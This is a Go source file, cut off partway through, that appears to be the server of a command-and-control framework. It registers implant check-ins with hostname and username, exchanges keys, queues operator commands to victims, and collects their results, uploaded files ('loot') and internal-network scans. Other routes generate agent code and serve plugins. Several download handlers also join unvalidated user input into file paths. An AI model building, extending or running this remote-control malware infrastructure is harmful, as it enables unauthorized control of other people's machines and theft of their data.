package main

import (
	"math/rand"
    "math/big"
	"crypto/md5"
    "encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
    "net/url"
	"crypto/tls"
	"encoding/json"
	"bufio"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"flag"
	"time"
	"regexp"
    "bytes"
    "errors"
    "math"
    "server/protocol"
    "server/client"
    "server/web_ui"
)
var (
    /*不可清理*/mutex   = &sync.Mutex{}

	/*不可清理*/key_map = make(map[string]string)
    /*不可清理*/keyMu sync.RWMutex

    //私钥
	key1_map = make(map[string][]byte)
    /*不可清理*/key1Mu sync.RWMutex
    //公钥
	key2_map = make(map[string][]byte)
    /*不可清理*/key2Mu sync.RWMutex
    //最终密钥
    key3_map = make(map[string][]int)
    /*不可清理*/key3Mu sync.RWMutex

    // 客户端获取消息,前端插入消息
	msgQueues   = make(map[string]*uidMsgQueue) // key: uid
    /*不可清理*/queuesMu  sync.RWMutex                     // 保护 map 本身的读写

    //客户端发送结果,前端获取结果
    msgResultQueues = make(map[string]*resultQueue)
    /*不可清理*/resultMu sync.RWMutex 

    //存储客户端结果
    msg_map_list []Msg_result
    /*不可清理*/mapMu sync.RWMutex 

    //客户端发送目录,前端获取目录
    msgFileQueue= make(map[string]*fileQueue)
    /*不可清理*/fileMu sync.RWMutex

    //缓存客户端目录
    msg_file_cache []Msg_file
    /*不可清理*/fcache sync.RWMutex

    /*不可清理*/base_map = make(map[string]string) //存
    /*不可清理*/baseMutex  sync.RWMutex
    /*不可清理*/uid_base = make(map[string]string) //写
    /*不可清理*/uidMutex  sync.RWMutex
    /*不可清理*/code_map = make(map[string]map[byte]int)
    /*不可清理*/cmapMutex  sync.RWMutex

	shell_net_post = make(map[string]string)
    /*不可清理*/ netMu sync.RWMutex

    sessionSlice []string
    /*不可清理*/error_str string

    UploadFile_byte_parts = make(map[string][]byte)
    /*不可清理*/upByteMu sync.RWMutex

    DownloadFile_byte_parts = make(map[string][]byte)
    parts_count = make(map[string]int)
    /*不可清理*/DoByteMu sync.RWMutex

    /*不可清理*/logger = &MyLog{}
    /*不可清理*/web_title string
    /*不可清理*/log_word = make(map[string]string)
)
type Msg_file struct {
    Uid string `json:"uid"`
    Taskid string `json:"taskid"`
    File string `json:"file"`
}
type fileQueue struct {
    files []Msg_file
    mu      sync.Mutex // 细粒度锁：只锁这个 UID 的结果
}
type Msg_result struct {
    Uid string `json:"uid"`
    Result string `json:"result"`
    Taskid string `json:"taskid"`
}
type resultQueue struct {
    results []Msg_result
    mu      sync.Mutex // 细粒度锁：只锁这个 UID 的结果
}
type Msg_get struct {
    Ori_Msg string `json:"Ori_msg"`
    Encry_Msg string `json:"Encry_msg"`
    Taskid string `json:"taskid"`
}
type uidMsgQueue struct {
    messages []Msg_get
    mu       sync.Mutex        // 每个 uid 独立的互斥锁
}
type MainHandler struct{}
//无权限交互
func (m *MainHandler) Index(conn, Get_Msg,switch_key,encry_key,download,result,net,info,upload,list,
                            option,uid_,username_,hostname,keyPart,filekey,windows_pro,port string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
        baseMutex.RLock()
        base_rounds,exist_base := base_map[port]
        baseMutex.RUnlock()
        cmapMutex.RLock()
        code_rounds,exist_code:= code_map[port]
        cmapMutex.RUnlock()
        if !exist_base && !exist_code {
            return
        }
		switch r.Method {
		case http.MethodGet:
			// 处理 GET 请求
			op := r.URL.Query().Get(option)
            var uid string
            uidBytes := r.URL.Query().Get(uid_)
            if uidBytes != "" {
                uid_decode,_ := customBase64Decode(uidBytes,code_rounds)
                uid = string(uid_decode)
                uidMutex.Lock()
                if _, exists := uid_base[uid]; !exists {
                    uid_base[uid] = base_rounds
                }
                uidMutex.Unlock()
            }
			switch op {
				case conn: //监听
                    clientIP := getClientIP(r)

                    shellname_get := r.URL.Query().Get(hostname)
                    shellname_c,_:= customBase64Decode(shellname_get,code_rounds)
                    shellname := string(shellname_c)

                    username_get := r.URL.Query().Get(username_)
                    username_c,_:= customBase64Decode(username_get,code_rounds)
                    username := string(username_c)

                    key_base := Get_conn(uid, username, shellname, clientIP,base_rounds)
                    fmt.Fprint(w, key_base)                
				case Get_Msg: //获取指令
                    data := GetMsg(uid,base_rounds)
                    fmt.Fprint(w,data)
				case switch_key: //发送与交换密钥

                    byte_base_key_mid:= r.URL.Query().Get(keyPart)
                    key_decode, _ := customBase64Decode(byte_base_key_mid,code_rounds)

				    err := Switch_key(uid,key_decode,base_rounds)
                    if err != nil {
                        return
                    }
				case encry_key: //获取未加密密钥
					func(uid string) {
						dataConnMu.RLock()
						defer dataConnMu.RUnlock()
                        for i := range data_conn.Conns {
                            conn := &data_conn.Conns[i] 
                            if uid == conn.Uid {
                                if conn.HostKey != "" && conn.HostKey != "null" {
                                    key_decode := customBase64Encode([]byte(conn.HostKey), base_rounds)
                                    fmt.Fprint(w, key_decode)
                                    EncryptHostKey(conn.Uid, conn.HostKey)
                                    break
                                } else {
                                    return
                                }
                            }
                        }
					}(uid)
                case download:

                    filekey := r.URL.Query().Get(filekey)

                    fileByte, err := DownloadFile(uid,filekey,code_rounds)
                    if err != nil {
                        return
                    }
                    w.Header().Set("Content-Type", "application/octet-stream")
                    w.Header().Set("Accept-Ranges", "bytes")
                    w.Write(fileByte)
                    if f, ok := w.(http.Flusher); ok {
                        f.Flush()
                    }
			}
		case http.MethodPost:
			op := r.URL.Query().Get(option)
			switch op {
				case result: //写入结果
                    err := r.ParseForm()
                    if err != nil {
                        return
                    }
                    baseuid := r.FormValue(uid_)
                    if baseuid == "" {
                        return
                    }
                    Byteuid, err := customBase64Decode(baseuid, code_rounds)
                    if err != nil {
                        return
                    }
                    uid := string(Byteuid)
                    results := r.FormValue(result)
                    taskid := r.FormValue(info)
                    if results == "" || taskid == "" {
                        return
                    }
                    Results(uid, results, taskid, code_rounds)
                case net: //接收内网信息
                    err := r.ParseForm()
                    if err != nil {
                        return
                    }
                    baseuid := r.FormValue(uid_)
                    if baseuid == "" {
                        return
                    }
                    Byteuid, err := customBase64Decode(baseuid, code_rounds)
                    if err != nil {
                        return
                    }
                    uid := string(Byteuid)
                    results := r.FormValue(result)
                    if uid == "" || results == "" {
                        return
                    }
                    Net_results(uid, results, code_rounds)

                case info:  //接收客户端信息
                    err := r.ParseForm()
                    if err != nil {
                        return
                    }
                    baseuid := r.FormValue(uid_)
                    if baseuid == "" {
                        return
                    }
                    Byteuid, err := customBase64Decode(baseuid, code_rounds)
                    if err != nil {
                        return
                    }
                    uid := string(Byteuid)
                    encry_str := r.FormValue(result)
                    clientIP := getClientIP(r)
                    keyMu.RLock()
                    key, ok3 := key_map[uid]
                    keyMu.RUnlock()
                    if encry_str == "" || !ok3 {
                        return
                    }
                    if windows_pro == "group_pro" {
                        Windows_GetInfo(uid, encry_str, key, clientIP, code_rounds)
                    } else {
                        GetInfo(uid, encry_str, key, clientIP, code_rounds)
                    }

                case upload:
                    reader, err := r.MultipartReader()
                    if err != nil {
                        return
                    }
                    var uid, result_, filename string
                    var fileData []byte
                    for {
                        part, err := reader.NextPart()
                        if err == io.EOF {
                            break
                        }
                        if err != nil {
                            return
                        }
                        if part.FormName() == uid_ {
                            buf, _ := io.ReadAll(part)
                            baseuid := string(buf)
                            Byteuid, err := customBase64Decode(baseuid, code_rounds)
                            if err != nil {
                                return
                            }
                            uid = string(Byteuid)
                        }
                        if part.FormName() == result {
                            buf, _ := io.ReadAll(part)
                            result_ = string(buf)
                        }
                        if part.FormName() == upload {
                            filename = part.FileName()
                            fileData, err = io.ReadAll(part)
                            if err != nil {
                                return
                            }
                        }
                    }
                    // 只有全部字段都不为空且 tmpFile 不为 nil 时才调用
                    if uid != "" && result_ != "" && filename != "" && len(fileData) > 0 {
                        UploadFileHandler(uid, result_, filename, fileData, code_rounds)
                    }

                case list: //客户端写入目录
                    err := r.ParseForm()
                    if err != nil {
                        return
                    }
                    baseuid := r.FormValue(uid_)
                    if baseuid == "" {
                        return
                    }
                    Byteuid, err := customBase64Decode(baseuid, code_rounds)
                    if err != nil {
                        return
                    }
                    uid := string(Byteuid)
                    file := r.FormValue(result)
                    taskid := r.FormValue(info)
                    if file == "" || taskid == "" {
                        return
                    }
                    Put_file_list(uid, file, taskid, code_rounds)
			}
		}
	}
}
//有权限交互,必须先登录,此路由下不需要错误报错回显
func User_index(web_route string)http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		usernameCookie, err := r.Cookie("cookie")
        if err != nil {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w, error_str)
            return
        }
        var foundUser bool

        for i := range sessionSlice {
            session := &sessionSlice[i] 
            if *session == usernameCookie.Value {
                foundUser = true
                break
            }
        }

        if !foundUser {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w, error_str)
            return
        }
		switch r.Method {
			case http.MethodGet:
				op := r.URL.Query().Get("op")
				switch op{
					case "listen": //用户操作,第一次交互

                        username := r.URL.Query().Get("username")

						str := Listen(username)
                        fmt.Fprint(w, str)
					case "getResults": //用户操作，获取执行结果

                        uid := r.URL.Query().Get("uid")
                        Taskid := r.URL.Query().Get("Taskid")
					
                        results := Getresults(uid,Taskid)
                        fmt.Fprint(w,results)
					case "getOs": //获取操作系统

                        uid := r.URL.Query().Get("uid")

						func(uid string){
							clientDataMu.RLock()
							defer clientDataMu.RUnlock()
                            for i := range client_data.Clients {
                                client := &client_data.Clients[i]
                                if uid == client.Uid {
                                    fmt.Fprintf(w, "%s", client.OS)
                                    break
                                }
                            }
						}(uid)
					case "insertKey": //插入密钥

                        uid := r.URL.Query().Get("uid")
                        username := r.URL.Query().Get("username")
                        shellname := r.URL.Query().Get("request")

                        dataConnMu.Lock()
                        defer dataConnMu.Unlock()
						Insert_key(uid, username,shellname)
                    case "msg": // 用户操作,写入指令
                        uid := r.URL.Query().Get("uid")
                        msg := r.URL.Query().Get("msg")
                        Taskid := r.URL.Query().Get("Taskid")
                        errStr := Getcmd(uid, msg, Taskid)
                        if errStr != "" {
                            json.NewEncoder(w).Encode(map[string]interface{}{
                                "code":    500,
                                "message": errStr,
                            })
                            return
                        }
                        json.NewEncoder(w).Encode(map[string]interface{}{
                            "code":    200,
                            "message": "Message sent successfully",
                        })
					case "delShellInnet": //用户操作删除内网

                        uid := r.URL.Query().Get("uid")
                        shellname := r.URL.Query().Get("request")
                        target := r.URL.Query().Get("target")

						str := Del_shell_innet(target,shellname,uid)
                        fmt.Fprintf(w,str)
					case "userIndex": //客户端信息

                        clientsCount := r.URL.Query().Get("clientsCount")
                        windows_pro := r.URL.Query().Get("group_pro")

                        if windows_pro == "group_pro"{
                            matchedClients, err := windows_pro_UserIndex(clientsCount)
                            if err != nil {
                                http.Error(w, err.Error(), http.StatusInternalServerError)
                                return
                            }
                            if matchedClients != nil {
                                w.Header().Set("Content-Type", "application/json")
                                err := json.NewEncoder(w).Encode(matchedClients)
                                if err != nil {
                                    http.Error(w, "json data error", http.StatusInternalServerError)
                                }
                            } else {
                                w.Header().Set("Content-Type", "text/plain")
                                w.Write([]byte("noNeeded"))
                            }
                        }else{
                            matchedClients, err := UserIndex(clientsCount)
                            if err != nil {
                                http.Error(w, err.Error(), http.StatusInternalServerError)
                                return
                            }
                            if matchedClients != nil {
                                w.Header().Set("Content-Type", "application/json")
                                err := json.NewEncoder(w).Encode(matchedClients)
                                if err != nil {
                                    http.Error(w, "json data error", http.StatusInternalServerError)
                                }
                            } else {
                                w.Header().Set("Content-Type", "text/plain")
                                w.Write([]byte("noNeeded"))
                            }
                        }
                    case "ServerIndex":

                        clientsCount := r.URL.Query().Get("clientsCount")

                        matchedClients, err := ServerIndex(clientsCount)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        if matchedClients != nil {
                            w.Header().Set("Content-Type", "application/json")
                            err := json.NewEncoder(w).Encode(matchedClients)
                            if err != nil {
                                http.Error(w, "json data error", http.StatusInternalServerError)
                            }
                        } else {
                            w.Header().Set("Content-Type", "text/plain")
                            w.Write([]byte("noNeeded"))
                        }
					case "delIndex": //删除第一次交互

                        uid := r.URL.Query().Get("uid")
					
                        DeleteEntry(uid)
					case "delInfo": // 删除客户端
                        uid := r.URL.Query().Get("uid")
                        info := r.URL.Query().Get("info")
                        var (
                            serverRemark string
                            found        bool
                        )
                        if info != "" {
                            windows_clientMu.Lock()
                            for i := range windows_client_data.Clients {
                                if uid == windows_client_data.Clients[i].Uid {
                                    serverRemark = windows_client_data.Clients[i].Server
                                    lastIdx := len(windows_client_data.Clients) - 1
                                    windows_client_data.Clients[i] = windows_client_data.Clients[lastIdx]
                                    windows_client_data.Clients = windows_client_data.Clients[:lastIdx]
                                    found = true
                                    break
                                }
                            }
                            windows_clientMu.Unlock()
                        } else {
                            clientDataMu.Lock()
                            for i := range client_data.Clients {
                                if uid == client_data.Clients[i].Uid {
                                    serverRemark = client_data.Clients[i].Server
                                    lastIdx := len(client_data.Clients) - 1
                                    client_data.Clients[i] = client_data.Clients[lastIdx]
                                    client_data.Clients = client_data.Clients[:lastIdx]
                                    
                                    found = true
                                    break
                                }
                            }
                            clientDataMu.Unlock()
                        }
                        if !found {
                            http.Error(w, "client not found", http.StatusNotFound)
                            return
                        }
                        if serverRemark != "" {
                            serverDataMu.Lock()
                            for i := range server_data.Servers {
                                server := &server_data.Servers[i]
                                if server.Remark == serverRemark {
                                    if server.Clients > 0 {
                                        server.Clients--
                                    }
                                    break
                                }
                            }
                            serverDataMu.Unlock()
                        }
                        keyMu.Lock()
                        delete(key_map, uid)
                        keyMu.Unlock()
                        logStr := fmt.Sprintf(log_word["removed_agent"], uid)
                        logger.WriteLog(logStr)
                        w.Header().Set("Content-Type", "application/json")
                        w.Write([]byte(`{"code":"200","message":"agent has been removed"}`))
					case "getFileList": //读取客户端目录
                        
                        uid := r.URL.Query().Get("uid")
                        Taskid := r.URL.Query().Get("Taskid")
                        
						file_str := Get_file_list(uid,Taskid)
                        if file_str != ""{
                            fmt.Fprintf(w,file_str)
                        }
                    case "downloadlog": //下载日志
                        // 使用系统默认临时目录
                        logFilePath := "server.log"
                        file, err := os.Open(logFilePath)
                        if err != nil {
                            http.Error(w, "failed to open log file", http.StatusInternalServerError)
                            return
                        }
                        defer file.Close()
                        w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(logFilePath))
                        w.Header().Set("Content-Type", "application/octet-stream")
                        w.Header().Set("Content-Transfer-Encoding", "binary")
                        w.Header().Set("Cache-Control", "no-cache")
                        http.ServeContent(w, r, logFilePath, time.Now(), file)
                    case "logRead":
                        pos := r.URL.Query().Get("pos")
                        posInt, err := strconv.Atoi(pos)
                        if err != nil {
                            http.Error(w, "invalid pos", http.StatusBadRequest)
                            return
                        }
                        lines, err := Log_read(posInt)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        json.NewEncoder(w).Encode(lines)                    
					case "getCurrentDir": //查询当前目录

                        uid := r.URL.Query().Get("uid")

						func(uid string){
							clientDataMu.RLock()
							defer clientDataMu.RUnlock()
                            for i := range client_data.Clients {
                                client := &client_data.Clients[i]
                                if uid == client.Uid {
                                    fmt.Fprint(w, client.CurrentDir)
                                    break
                                }
                            }
						}(uid)
					case "getFile": //获取所有用户战利品

                        username := r.URL.Query().Get("username")

						Get_loots(username,web_route,w,r)
                    case "client_loot":

                        username := r.URL.Query().Get("username")

                        Get_loots_pro(username,web_route,w,r)
                    case "download_loot":
                        uid := r.URL.Query().Get("uid")
                        file := r.URL.Query().Get("file")
                        if uid == "" || file == "" {
                            http.Error(w, "uid and file parameters are required", http.StatusBadRequest)
                            return
                        }
                        filePath := filepath.Join("uploads", uid, file)
                        if _, err := os.Stat(filePath); os.IsNotExist(err) {
                            http.Error(w, "file not found", http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Disposition", "attachment; filename="+strconv.Quote(file))
                        w.Header().Set("Content-Type", "application/octet-stream")
                        w.Header().Set("Content-Transfer-Encoding", "binary")
                        w.Header().Set("Cache-Control", "no-cache")
                        http.ServeFile(w, r, filePath)
                    case "getAll": //获取用户名下客户端

                        username := r.URL.Query().Get("username")

                        shell_list, err := Get_Clients(username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        if err := json.NewEncoder(w).Encode(shell_list); err != nil {
                            http.Error(w, "json error", http.StatusInternalServerError)
                            return
                        }
					case "getShellInnet": //获取客户端内网IP

                        uid := r.URL.Query().Get("uid")

						func(uid string){
							clientDataMu.RLock()
							defer clientDataMu.RUnlock()
							for i := range client_data.Clients{
                                client := &client_data.Clients[i]
								if uid == client.Uid{
									fmt.Fprintf(w, "%s",client_data.Clients[i].LocalIP)
									break
								}
							}
						}(uid)
                    case "net_getresults": // 获取客户端内网资产

                        uid := r.URL.Query().Get("uid")

                        result, err := Net_getresults(uid)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusBadRequest)
                            return
                        }
                        fmt.Fprint(w, result)                    
					case "getInnet": //查询内网资产

                        uid := r.URL.Query().Get("uid")

						getInnet(uid,w)
                    case "checkTime":
                        checkMap, err := Check_Time()
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "check_time_pro":
                        checkMap, err := Check_Time_Pro()
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "checkclient":
                        checkMap, err := Check_clients()
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "confirm":

                        uid := r.URL.Query().Get("uid")
                        username := r.URL.Query().Get("username")

                        client, err := Confirm_chan(uid, username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        jsonData, err := json.Marshal(client)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Write(jsonData)
                    case "agentcode":

                        uid := r.URL.Query().Get("uid")
                        username := r.URL.Query().Get("username")
                        user := r.URL.Query().Get("user")
                        hostname := r.URL.Query().Get("hostname")
                        keyPart := r.URL.Query().Get("keyPart")
                        filekey := r.URL.Query().Get("filekey")
                        ptc := r.URL.Query().Get("protocol")
                        _os := r.URL.Query().Get("os")
                        server := r.URL.Query().Get("server")
                        Path := r.URL.Query().Get("Path")
                        ConnPath := r.URL.Query().Get("ConnPath")
                        MsgPath := r.URL.Query().Get("MsgPath")
                        switch_key := r.URL.Query().Get("switch_key")
                        encry_key := r.URL.Query().Get("encry_key")
                        download := r.URL.Query().Get("download")
                        result := r.URL.Query().Get("result")
                        _net := r.URL.Query().Get("net")
                        info := r.URL.Query().Get("info")
                        upload := r.URL.Query().Get("upload")
                        list := r.URL.Query().Get("list")
                        option := r.URL.Query().Get("option")
                        code_ := r.URL.Query().Get("code")
                        windows_pro := r.URL.Query().Get("group_pro")
                        port := strings.Split(server,":")[1]
                        baseMutex.RLock()
                        base_rounds,_exist := base_map[port]
                        baseMutex.RUnlock()
                        if !_exist {
                            return
                        }
                        code := client.Generate_agent(ptc,_os,server,Path,ConnPath,MsgPath,switch_key,
                            encry_key,download,result,_net,info,upload,list,option,username,user,uid,
                            hostname,keyPart,filekey,code_,base_rounds,windows_pro)
                        fmt.Fprint(w, code)
                    case "delserver":

                        port := r.URL.Query().Get("port")

                        found := false
                        serverDataMu.Lock()
                        defer serverDataMu.Unlock()
                        for i := len(server_data.Servers) - 1; i >= 0; i-- {
                            server := &server_data.Servers[i]
                            if port == server.Port {
                                if server.Clients != 0 {
                                    stop_str := fmt.Sprintf(log_word["stop_server"])
                                    fmt.Fprint(w, stop_str)
                                    logger.WriteLog(stop_str)
                                    return
                                }
                                // 清理 Map 数据
                                baseMutex.Lock()
                                delete(base_map, port)
                                baseMutex.Unlock()
                                
                                cmapMutex.Lock()
                                delete(code_map, port)
                                cmapMutex.Unlock()

                                // 停止服务
                                protocol.StopServer(port)

                                // 执行删除
                                server_data.Servers = append(server_data.Servers[:i], server_data.Servers[i+1:]...)
                                
                                found = true
                                stop_str := fmt.Sprintf(log_word["removed_server"], port)
                                logger.WriteLog(stop_str)
                                break // 找到并删除后退出
                            }
                        }
                        if !found {
                            stop_str := fmt.Sprintf(log_word["no_found_server"], port)
                            logger.WriteLog(stop_str)
                        }
                    case "getloot":

                        uid := r.URL.Query().Get("uid")
                        file := r.URL.Query().Get("file")

                        if uid == "" || file == "" {
                            http.Error(w, "no parameter", http.StatusBadRequest)
                            return
                        }
                        filePath := filepath.Join("uploads", uid, file)
                        if _, err := os.Stat(filePath); os.IsNotExist(err) {
                            http.Error(w, "no file", http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Disposition", "attachment; filename="+strconv.Quote(file))
                        w.Header().Set("Content-Type", "application/octet-stream")
                        w.Header().Set("Content-Transfer-Encoding", "binary")
                        w.Header().Set("Cache-Control", "no-cache")
                        http.ServeFile(w, r, filePath)
                    case "changeMsh":
                        uid := r.URL.Query().Get("uid")
                        s_id := r.URL.Query().Get("s_id")
                        pos := r.URL.Query().Get("pos")
                        ok, errStr := ChangeMsh(uid, s_id, pos)
                        if !ok {
                            json.NewEncoder(w).Encode(map[string]interface{}{
                                "code":    400,
                                "message": errStr,
                            })
                            return
                        }
                        json.NewEncoder(w).Encode(map[string]interface{}{
                            "code":    200,
                            "message": "reordered",
                        })                    
                    case "getMsgList":

                        uid := r.URL.Query().Get("uid")

                        //消息带结果，获取msg_get中uid对应的消息
                        msgList := GetMsgList(uid)
                        w.Header().Set("Content-Type", "application/json; charset=utf-8")
                        json.NewEncoder(w).Encode(map[string][]string{
                            "messages": msgList,
                        })
                    //按索引msg_get中uid对应的消息
                    case "delMsgGet":
                        uid := r.URL.Query().Get("uid")
                        indexStr := r.URL.Query().Get("index")
                    
                        if uid == "" {
                            http.Error(w, "missing uid", http.StatusBadRequest)
                            return
                        }
                    
                        index, err := strconv.Atoi(indexStr)
                        if err != nil {
                            http.Error(w, "invalid index", http.StatusBadRequest)
                            return
                        }
                    
                        // 先从 map 里取队列
                        queuesMu.RLock()
                        q := msgQueues[uid]
                        queuesMu.RUnlock()
                        if q == nil {
                            http.Error(w, "uid queue not found", http.StatusNotFound)
                            return
                        }
                    
                        // 只锁这个 uid 的队列
                        q.mu.Lock()
                        defer q.mu.Unlock()
                    
                        if index < 0 || index >= len(q.messages) {
                            http.Error(w, "index out of range", http.StatusBadRequest)
                            return
                        }
                    
                        // 删除队列内 index 的消息
                        q.messages = append(q.messages[:index], q.messages[index+1:]...)
                    
                        fmt.Fprintf(w, "queue for uid %s at index %d deleted successfully", uid, index)                                
                    //按索引删除msg_map中uid对应的消息
                    case "delMsgMap":

                        uid := r.URL.Query().Get("uid")
                        indexStr := r.URL.Query().Get("index")

                        mapMu.Lock()
                        defer mapMu.Unlock()
                        index, err := strconv.Atoi(indexStr)
                        if err != nil {
                            http.Error(w, "invalid index", http.StatusBadRequest)
                            return
                        }
                        // 找到 uid 在 msg_map_list 中所有消息的全局索引列表
                        var uidIndices []int
                        for i := range msg_map_list {
                            msg := &msg_map_list[i]
                            if msg.Uid == uid {
                                uidIndices = append(uidIndices, i)
                            }
                        }
                        if index < 0 || index >= len(uidIndices) {
                            http.Error(w, "index out of range", http.StatusBadRequest)
                            return
                        }
                        delIdx := uidIndices[index]
                        msg_map_list = append(msg_map_list[:delIdx], msg_map_list[delIdx+1:]...)
                        uidIndices = nil
                        fmt.Fprintf(w, "msg_map_list for uid %s at index %d deleted successfully", uid, index)                
                    case "getMsgPost":

                        uid := r.URL.Query().Get("uid")

                        mapMu.RLock()
                        var msgList []string
                        for i := range msg_map_list {
                            msg := &msg_map_list[i]
                            if msg.Uid == uid {
                                msgList = append(msgList, msg.Taskid+":"+msg.Result)
                            }
                        }
                        mapMu.RUnlock()
                        w.Header().Set("Content-Type", "application/json; charset=utf-8")
                        json.NewEncoder(w).Encode(map[string][]string{
                            "messages": msgList,
                        })
                    //获取插件
                    case "getPlugin":

                        _os := r.URL.Query().Get("os")
                        remark := r.URL.Query().Get("remark")

                        serverPluginMu.RLock()
                        defer serverPluginMu.RUnlock()
                        //创建切片
                        code_silce := make([]string, 0)
                        for i := range server_plugin.Plugins {
                            plugin := &server_plugin.Plugins[i]
                            if plugin.Remark == remark && plugin.os == _os {
                                // 返回插件的详细信息
                                code_silce = append(code_silce,plugin.Code)
                            }
                        }
                        if code_silce != nil && len(code_silce) > 0 {
                            w.Header().Set("Content-Type", "application/json")
                            json.NewEncoder(w).Encode(map[string][]string{
                                "code": code_silce,
                            })
                        } else {
                            w.Header().Set("Content-Type", "application/json")
                            json.NewEncoder(w).Encode(map[string][]string{
                                "code": {"/*code*/"},
                            })
                        }
                    //按os与remark删除插件
                    case "delPlugin":
                        _os := r.URL.Query().Get("os")
                        remark := r.URL.Query().Get("remark")
                        serverPluginMu.Lock()
                        defer serverPluginMu.Unlock()
                        if _os == "" || remark == "" {
                            http.Error(w, "os and remark are required", http.StatusBadRequest)
                            return
                        }
                        originalLen := len(server_plugin.Plugins)
                        newPlugins := make([]Plugin, 0, originalLen)
                        deleted := false
                        for i := range server_plugin.Plugins {
                            p := &server_plugin.Plugins[i]
                            if p.os == _os && p.Remark == remark {
                                deleted = true
                                continue // 跳过 = 删除
                            }
                            newPlugins = append(newPlugins, *p)
                        }
                        if !deleted {
                            http.Error(
                                w,
                                fmt.Sprintf("No plugin found for remark %s and os %s", remark, _os),
                                http.StatusNotFound,
                            )
                            return
                        }
                        server_plugin.Plugins = newPlugins
                        fmt.Fprintf(
                            w,
                            "Plugin(s) for remark %s and os %s deleted successfully",
                            remark,
                            _os,
                        )
                    case "delFileList":

                        uid := r.URL.Query().Get("uid")
                        indexStr := r.URL.Query().Get("index")

                        Del_file_list(uid, indexStr)
                        w.Header().Set("Content-Type", "application/json")
                        json.NewEncoder(w).Encode(map[string]string{
                            "code": "200",
                            "message": "File deleted successfully",
                        })
                    case "readFileList":

                        uid := r.URL.Query().Get("uid")

                        fileList := Read_file_list(uid)
                        // 返回 JSON 格式的文件列表
                        w.Header().Set("Content-Type", "application/json")
                        json.NewEncoder(w).Encode(map[string]interface{}{
                            "code": "200",
                            "data": fileList,
                        })
                    case "cleanup":
                        ClearUnmarkedGlobalVars()
                    case "getChatSlice":
                        uploadDir := "./chat_uploads/"
                        files, err := os.ReadDir(uploadDir)
                        dataChatmu.Lock()
                        defer dataChatmu.Unlock()
                        if err == nil {
                            maxChatID := 0
                            for i := range data_chat.Chats {
                                c := &data_chat.Chats[i]
                                if c.Chatid > maxChatID {
                                    maxChatID = c.Chatid
                                }
                            }
                            for _, f := range files {
                                if f.IsDir() {
                                    continue
                                }
                                filename := f.Name()
                                exists := false
                                for i := range data_chat.Chats {
                                    c := &data_chat.Chats[i]
                                    if c.Message == filename && c.Type == "file" {
                                        exists = true
                                        break
                                    }
                                }
                                if exists {
                                    continue
                                }
                                maxChatID++
                                fileInfo, _ := os.Stat(uploadDir + filename)
                                chat := Chat{
                                    Username: "history file",
                                    Message:  filename,
                                    Time:     fileInfo.ModTime().Format("2006-01-02 15:04:05"),
                                    Chatid:   maxChatID,
                                    Type:     "file",
                                }
                                data_chat.Chats = append(data_chat.Chats, chat)
                            }
                        }
                        w.Header().Set("Content-Type", "application/json; charset=utf-8")
                        chatsJSON, err := json.Marshal(data_chat.Chats)
                        if err != nil {
                            log.Println("getChatSlice marshal error:", err)
                            chatsJSON = []byte("[]")
                        }
                        w.WriteHeader(http.StatusOK)
                        w.Write(chatsJSON)                                       
                    case "getNewChat":
                        w.Header().Set("Content-Type", "application/json; charset=utf-8")
                        var lastChat Chat
                        dataChatmu.RLock()
                        defer dataChatmu.RUnlock()
                        if len(data_chat.Chats) > 0 {
                            lastChat = data_chat.Chats[len(data_chat.Chats)-1] // 取最后一条
                        } else {
                            lastChat = Chat{} // 没有消息时返回空对象
                        }
                        chatJSON, err := json.Marshal(lastChat)
                        if err != nil {
                            log.Println("getNewChat marshal error:", err)
                            chatJSON = []byte("{}") // 出错返回空对象
                        }
                        w.WriteHeader(http.StatusOK)
                        w.Write(chatJSON)
                    case "downloadChatFile":
                        filename := r.URL.Query().Get("filename")
                        if filename == "" {
                            http.Error(w, "missing filename", http.StatusBadRequest)
                            return
                        }
                        filePath := "./chat_uploads/" + filename
                        if _, err := os.Stat(filePath); os.IsNotExist(err) {
                            http.Error(w, "file not found", http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Type", "application/octet-stream")
                        w.Header().Set("Content-Disposition", 
                            "attachment; filename*=UTF-8''"+url.QueryEscape(filename))
                        http.ServeFile(w, r, filePath)                    
				}
			case http.MethodPost:
				op := r.URL.Query().Get("op")
				switch op{
                    case "uploadFile":
                        uid := r.FormValue("uid")
                        file, _, err := r.FormFile("uploadFile")
                        filename := r.FormValue("filename")
                        splitSize := r.FormValue("splitSize")
                        if err != nil {
                            http.Error(w, "parameter does not exist", http.StatusInternalServerError)
                            return
                        }
                        defer file.Close()
                        // 调用处理文件的函数
